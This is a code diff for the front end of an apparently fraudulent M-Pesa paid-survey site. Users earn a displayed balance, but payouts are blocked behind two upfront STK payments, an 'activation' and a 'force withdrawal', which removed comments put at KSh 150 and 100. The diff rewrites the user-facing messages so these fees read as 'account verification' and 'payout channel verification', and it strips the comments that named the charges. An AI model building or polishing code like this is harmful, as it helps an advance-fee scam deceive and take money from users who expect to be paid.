@@ -58,14 +58,27 @@ function showPanel(name) {
   if (navEl) navEl.classList.add('active');
   closeSidebar();
   if (name === 'survey') loadQuestions(currentPage);
-   if (name === 'withdraw') {
-  loadStats(); // intentionally not awaited — updateWithdrawPanel runs inside loadStats() when done
-  // Hide all stages while loading to prevent flash
-  document.getElementById('wd-locked').classList.add('hidden');
-  document.getElementById('wd-force').classList.add('hidden');
-  document.getElementById('wd-unlocked').classList.add('hidden');
-}
+  if (name === 'withdraw') {
+    loadStats();
+    document.getElementById('wd-locked').classList.add('hidden');
+    document.getElementById('wd-force').classList.add('hidden');
+    document.getElementById('wd-unlocked').classList.add('hidden');
+  }
   if (name === 'transactions') renderAllTransactions();
+}
+
+// ════════════════════════════════════════════
+// MODALS
+// ════════════════════════════════════════════
+function showModal(type) {
+  document.getElementById('modal-overlay').classList.add('show');
+  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
+  document.getElementById('modal-' + type).classList.add('show');
+}
+
+function closeModal() {
+  document.getElementById('modal-overlay').classList.remove('show');
+  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
 }
 
 // ════════════════════════════════════════════
@@ -207,7 +220,7 @@ function updateDashboard() {
   const pct = Math.round((completed / total) * 100);
 
   document.getElementById('sidebar-balance').textContent = `KSh ${bal}`;
-  document.getElementById('sidebar-earned').textContent = `Total earned: KSh ${earned}`;
+  document.getElementById('sidebar-earned').textContent = `Total compensation: KSh ${earned}`;
   document.getElementById('mobile-balance').textContent = `KSh ${bal}`;
   document.getElementById('stat-balance').textContent = bal;
   document.getElementById('stat-earned').textContent = earned;
@@ -221,27 +234,23 @@ function updateDashboard() {
   const greet = hour < 12 ? 'Good morning' : hour < 17 ? 'Good afternoon' : 'Good evening';
   document.getElementById('dash-greeting').textContent = `${greet}, ${userProfile?.name || 'there'}!`;
 
-  // Banner: hide when fully done, update text for each stage
   const banner = document.getElementById('activation-banner');
   const bannerTitle = document.getElementById('activation-banner-title');
   const bannerDesc = document.getElementById('activation-banner-desc');
   const bannerBtn = document.getElementById('activation-banner-btn');
 
   if (stats.forceVerified) {
-    // Fully done — hide banner entirely
     banner.classList.add('hidden');
   } else if (stats.activated) {
-    // Paid 150, now needs 100
     banner.classList.remove('hidden');
-    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:6px"></i>Activate Force Withdrawal';
-    if (bannerDesc) bannerDesc.textContent = 'Your account is verified. if withrawal is having an issue then try force withrawal and that will work.';
-    if (bannerBtn) { bannerBtn.textContent = 'Force Withdraw Now'; bannerBtn.onclick = () => showPanel('withdraw'); }
+    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-link" style="margin-right:6px"></i>Payout Channel Verification Required';
+    if (bannerDesc) bannerDesc.textContent = 'Your identity has been verified. Complete payout channel verification to enable payment processing to your M-Pesa account.';
+    if (bannerBtn) { bannerBtn.textContent = 'Complete Verification'; bannerBtn.onclick = () => showPanel('withdraw'); }
   } else {
-    // Not activated at all
     banner.classList.remove('hidden');
-    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-unlock" style="margin-right:6px"></i>Verify Account to Unlock Rewards';
-    if (bannerDesc) bannerDesc.textContent = 'To verify account ownership and maintain platform security, a one-time verification process is required before your first reward redemption.';
-    if (bannerBtn) { bannerBtn.textContent = 'Verify Now'; bannerBtn.onclick = () => showPanel('withdraw'); }
+    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:6px"></i>Account Verification Required';
+    if (bannerDesc) bannerDesc.textContent = 'To verify your registered mobile number and activate M-Pesa payment services, a one-time account verification process is required before your first payment request.';
+    if (bannerBtn) { bannerBtn.textContent = 'Verify Account'; bannerBtn.onclick = () => showPanel('withdraw'); }
   }
 
   renderDashTransactions();
@@ -258,7 +267,7 @@ function renderDashTransactions() {
   const el = document.getElementById('dash-tx-list');
   const txs = (stats.transactions || []).slice(0, 6);
   if (!txs.length) {
-    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No Activity yet.</p></div>';
+    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
     return;
   }
   el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
@@ -268,7 +277,7 @@ function renderAllTransactions() {
   const el = document.getElementById('all-tx-list');
   const txs = stats.transactions || [];
   if (!txs.length) {
-    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No Activity yet.</p></div>';
+    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
     return;
   }
   el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
@@ -324,7 +333,7 @@ function renderQuestions(questions) {
         <span class="question-cat">${q.category}</span>
         <div style="display:flex;align-items:center;gap:8px;">
           ${isAnswered
-            ? `<span class="question-answered-badge"><i class="fas fa-check-circle"></i> Answered</span>`
+            ? `<span class="question-answered-badge"><i class="fas fa-check-circle"></i> Completed</span>`
             : `<span class="question-reward"><i class="fas fa-coins"></i> KSh ${q.reward}</span>`
           }
         </div>
@@ -340,7 +349,7 @@ function renderQuestions(questions) {
       <div class="question-result" id="result-${q.id}">
         ${isAnswered
           ? `<span style="color:var(--text3);font-size:0.82rem;display:flex;align-items:center;gap:6px;margin-top:8px;">
-               <i class="fas fa-lock" style="color:var(--green-dark)"></i> You have already answered this question
+               <i class="fas fa-lock" style="color:var(--green-dark)"></i> You have already completed this question
              </span>`
           : ''
         }
@@ -365,7 +374,7 @@ async function submitAnswer(questionId, answerIndex, reward) {
     const data = await apiFetch('/survey/answer', 'POST', { questionId, answer: answerIndex });
 
     if (data.alreadyAnswered) {
-      toast('You already answered this question.', 'info');
+      toast('You have already completed this question.', 'info');
       card.dataset.answered = 'true';
       return;
     }
@@ -379,15 +388,15 @@ async function submitAnswer(questionId, answerIndex, reward) {
       selectedBtn.classList.add('selected-correct');
       card.classList.add('correct');
       resultEl.className = 'question-result correct';
-      resultEl.innerHTML = `<i class="fas fa-check-circle"></i> Correct! Rewarded KSh ${data.earned}`;
+      resultEl.innerHTML = `<i class="fas fa-check-circle"></i> Correct! Compensation of KSh ${data.earned} added.`;
       showEarnPop(data.earned);
-      toast(`Correct! +KSh ${data.earned} added to your balance.`, 'success');
+      toast(`Correct! +KSh ${data.earned} compensation added.`, 'success');
     } else {
       selectedBtn.classList.add('selected-wrong');
       card.classList.add('wrong');
       resultEl.className = 'question-result wrong';
-      resultEl.innerHTML = `<i class="fas fa-times-circle"></i> Wrong. ${data.explanation || ''}`;
-      toast('Wrong answer. Keep trying!', 'error');
+      resultEl.innerHTML = `<i class="fas fa-times-circle"></i> Incorrect. ${data.explanation || ''}`;
+      toast('Incorrect answer. Keep going!', 'error');
     }
 
     card.dataset.answered = 'true';
@@ -448,7 +457,7 @@ function renderPageDots(total) {
 }
 
 // ════════════════════════════════════════════
-// WITHDRAW
+// PAYMENT REQUEST (WITHDRAW)
 // ════════════════════════════════════════════
 function formatPhoneDisplay(phone) {
   let ph = String(phone || '');
@@ -467,22 +476,18 @@ function updateWithdrawPanel() {
   const forceDiv   = document.getElementById('wd-force');
   const unlockedDiv = document.getElementById('wd-unlocked');
 
-  // Always hide all stages first
   lockedDiv.classList.add('hidden');
   forceDiv.classList.add('hidden');
   unlockedDiv.classList.add('hidden');
   phoneRow.style.display = 'none';
 
   if (!stats.activated) {
-    // ── Stage 1: not activated ──
-    statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-lock"></i> Not Activated</span>';
+    statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>';
     lockedDiv.classList.remove('hidden');
 
   } else if (!stats.forceVerified) {
-    // ── Stage 2: 
-    statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Verified – Withdrawal Pending</span>';
+    statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Identity Verified – Payout Channel Pending</span>';
 
-    // Show the registered number used 
     if (stats.activationPhone) {
       phoneRow.style.display = 'flex';
       regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
@@ -490,7 +495,6 @@ function updateWithdrawPanel() {
     forceDiv.classList.remove('hidden');
 
   } else {
-    // ── Stage 3: fully unlocked ──
     statusEl.innerHTML = '<span class="chip"><i class="fas fa-check"></i> Fully Verified</span>';
     if (stats.activationPhone) {
       phoneRow.style.display = 'flex';
@@ -509,7 +513,7 @@ function updateSlider() {
   document.getElementById('wd-amount-display').textContent = val;
 }
 
-
+// ── Stage 1: Account Verification ──
 async function doActivate() {
   const phone = document.getElementById('act-phone').value.trim();
   const errEl = document.getElementById('act-error');
@@ -525,13 +529,13 @@ async function doActivate() {
   try {
     const data = await apiFetch('/activation/initiate', 'POST', { phone });
     activationRef = data.reference;
-    showAlert(succEl, 'M-Pesa STK prompt sent! Enter your PIN on your phone.');
-    toast('Check your phone for the M-Pesa prompt.', 'info');
+    showAlert(succEl, 'M-Pesa STK prompt sent. Enter your PIN on your phone to complete verification.');
+    toast('Check your phone for the M-Pesa verification prompt.', 'info');
     startActivationPoll(activationRef);
   } catch (err) {
-    showAlert(errEl, err.message || 'Failed to initiate payment.');
+    showAlert(errEl, err.message || 'Failed to initiate verification.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Verify Account ';
+    btn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account';
   }
 }
 
@@ -545,30 +549,29 @@ function startActivationPoll(ref) {
     if (attempts > 30) {
       clearInterval(activationPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Verify Account ';
+      btn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account';
       return;
     }
     try {
       const data = await apiFetch(`/activation/status/${ref}`);
       if (data.status === 'success') {
         clearInterval(activationPollTimer);
-        // Reload full stats — this fetches activationPhone from backend
         await loadStats();
-        toast('Account verified! Fot Those Having Issues with the withdrawal process, you can try force withdrawal which will trigger the withdrawal process.', 'success');
+        toast('Account verified successfully. Payout channel verification is required before your first payment request.', 'success');
         btn.disabled = false;
       } else if (data.status === 'failed') {
         clearInterval(activationPollTimer);
-        showAlert(document.getElementById('act-error'), 'Payment failed. Please try again.');
+        showAlert(document.getElementById('act-error'), 'Verification payment failed. Please try again.');
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Verify Account ';
+        btn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account';
       }
     } catch (err) {
-    console.error('loadStats failed:', err.message);
-  }
+      console.error('Poll error:', err.message);
+    }
   }, 3000);
 }
 
-// ── Force Withdrawal (KSh 100) ──
+// ── Stage 2: Payout Channel Verification ──
 async function doForceVerify() {
   const errEl = document.getElementById('fv-error');
   const succEl = document.getElementById('fv-success');
@@ -582,13 +585,13 @@ async function doForceVerify() {
   try {
     const data = await apiFetch('/activation/force/initiate', 'POST', {});
     const displayPhone = formatPhoneDisplay(data.phone);
-    showAlert(succEl, `M-Pesa prompt sent to ${displayPhone}. Enter your PIN on your phone.`);
-    toast('Check your phone to force withdraw.', 'info');
+    showAlert(succEl, `M-Pesa prompt sent to ${displayPhone}. Enter your PIN on your phone to complete payout channel verification.`);
+    toast('Check your phone to complete payout channel verification.', 'info');
     startForceVerifyPoll(data.reference, btn);
   } catch (err) {
-    showAlert(errEl, err.message || 'Failed to initiate payment.');
+    showAlert(errEl, err.message || 'Failed to initiate payout channel verification.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal';
+    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Verify Payout Channel';
   }
 }
 
@@ -601,7 +604,7 @@ function startForceVerifyPoll(ref, btn) {
     if (attempts > 30) {
       clearInterval(forceVerifyPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal ';
+      btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Verify Payout Channel';
       return;
     }
     try {
@@ -609,21 +612,21 @@ function startForceVerifyPoll(ref, btn) {
       if (data.status === 'success') {
         clearInterval(forceVerifyPollTimer);
         await loadStats();
-        toast('Force withdrawal activated! You can now withdraw your earnings.', 'success');
+        toast('Payout channel verified. You may now submit payment requests.', 'success');
         btn.disabled = false;
       } else if (data.status === 'failed') {
         clearInterval(forceVerifyPollTimer);
-        showAlert(document.getElementById('fv-error'), 'Payment failed. Please try again.');
+        showAlert(document.getElementById('fv-error'), 'Verification failed. Please try again.');
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal';
+        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Verify Payout Channel';
       }
     } catch (err) {
-    console.error('loadStats failed:', err.message);
-  }
+      console.error('Poll error:', err.message);
+    }
   }, 3000);
 }
 
-// ── Withdrawal ──
+// ── Payment Request ──
 async function doWithdraw() {
   const phone = document.getElementById('wd-phone').value.trim();
   const amount = document.getElementById('wd-slider').value;
@@ -633,7 +636,7 @@ async function doWithdraw() {
 
   clearAlert(errEl); clearAlert(succEl);
   if (!phone) { showAlert(errEl, 'Enter your M-Pesa number.'); return; }
-  if (parseFloat(amount) > stats.balance) { showAlert(errEl, 'Insufficient balance.'); return; }
+  if (parseFloat(amount) > stats.balance) { showAlert(errEl, 'Insufficient compensation balance.'); return; }
 
   btn.disabled = true;
   btn.innerHTML = '<span class="spinner"></span> Processing...';
@@ -644,14 +647,14 @@ async function doWithdraw() {
     updateDashboard();
     updateWithdrawPanel();
     showAlert(succEl, data.message);
-    toast('Withdrawal request submitted successfully!', 'success');
+    toast('Payment request submitted successfully!', 'success');
     document.getElementById('wd-phone').value = '';
     loadStats();
   } catch (err) {
-    showAlert(errEl, err.message || 'Withdrawal failed.');
+    showAlert(errEl, err.message || 'Payment request failed.');
   } finally {
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-paper-plane"></i> Request Withdrawal';
+    btn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment Request';
   }
 }
 
